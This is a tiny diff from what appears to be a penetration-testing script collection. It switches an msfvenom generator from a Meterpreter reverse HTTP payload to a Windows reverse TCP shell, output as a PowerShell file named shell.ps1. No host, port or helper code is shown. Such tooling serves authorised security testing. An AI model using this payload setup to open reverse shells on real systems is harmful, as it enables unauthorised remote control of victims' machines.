@@ -6,7 +6,7 @@ Create PS1 file
 
 source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"
 
-payload="windows/x64/meterpreter_reverse_http"
+payload="windows/shell_reverse_tcp"
 format="psh"
 filename="shell.ps1"
 
